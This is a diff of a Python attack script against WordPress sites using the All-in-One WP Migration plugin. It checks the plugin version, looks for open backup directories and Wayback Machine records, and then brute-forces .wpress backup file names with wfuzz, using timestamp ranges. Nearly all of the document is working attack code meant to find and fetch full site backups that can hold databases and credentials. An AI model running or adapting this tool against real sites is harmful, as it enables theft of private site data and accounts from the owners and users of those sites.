@@ -30,20 +30,32 @@ parser.add_argument("-u", "--url", required=True, help="Wordpress Url")
 args = parser.parse_args()
 url = args.url
 
+
+def vercheck (url,headers):
+	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
+	if "7.15" in vercheck.content:
+		print("This version is not vulnerable sorry")
+		sys.exit(0)
+
+def lazycheck(url,headers):
+	lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,verify=False)
+	if ".wpress" in lazycheck.content:
+		print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
+		print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
+		sys.exit(0)
+
+def wayback(domain,headers):
+	wayback = session.get("http://web.archive.org/cdx/search/cdx?url="+url+"*&output=txt&fl=original&collapse=urlkey", headers=headers,verify=False)
+	if "wp-content/ai1wm-backups" in wayback.content:
+		print ("[*] OOOOOOO Wayback machine has a potenital url to check.")
+		for line in wayback.content:
+			if ".wpress" in line:
+				print (line)
+
+
+
+
 headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
-vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
-if "7.15" in vercheck.content:
-	print("This version is not vulnerable sorry")
-	sys.exit(0)
-
-lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,verify=False)
-if ".wpress" in lazycheck.content:
-	print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
-	print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
-	sys.exit(0)
-
-
-
 response = session.get(""+url+"/wp-content/ai1wm-backups/web.config", headers=headers,verify=False)
 
 
@@ -57,8 +69,14 @@ if response.status_code == 200:
 		time_hms = timestamp.strftime("%H%M%S")
 		r = session.get(""+url+"", headers=headers,verify=False)
 		domain = urlparse(r.url).netloc
+		print ("Checking Wayback Urls")
+		wayback(domain,headers)
+		print ("Checking Exposed Backup Dir")
+		lazycheck(url,headers)
+		print ("Checking Plugin Version")
+		vercheck (url,headers)
 		print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
 		os.system("wfuzz -c -z range,01-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZ-FUZ2Z.wpress")
 
-else
+else:
 	print ("[*] Sorry not able to find the file required to start the tests [*] ")
